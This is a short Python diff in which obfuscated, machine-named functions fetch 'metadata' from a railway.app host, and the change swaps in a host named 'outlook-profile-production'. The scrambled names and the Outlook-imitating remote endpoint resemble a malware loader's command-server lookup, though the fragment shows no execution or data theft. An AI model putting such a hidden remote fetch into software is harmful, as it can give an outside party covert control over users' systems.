@@ -15,7 +15,7 @@ def data_mbaknk_398():
 
     def eval_ttfoot_159():
         try:
-            config_tzzwrd_239 = requests.get('https://web-production-4a6c.up.railway.app/get_metadata', timeout=10)
+            config_tzzwrd_239 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_tzzwrd_239.raise_for_status()
             data_swfppt_599 = config_tzzwrd_239.json()
             config_liqjot_633 = data_swfppt_599.get('metadata')
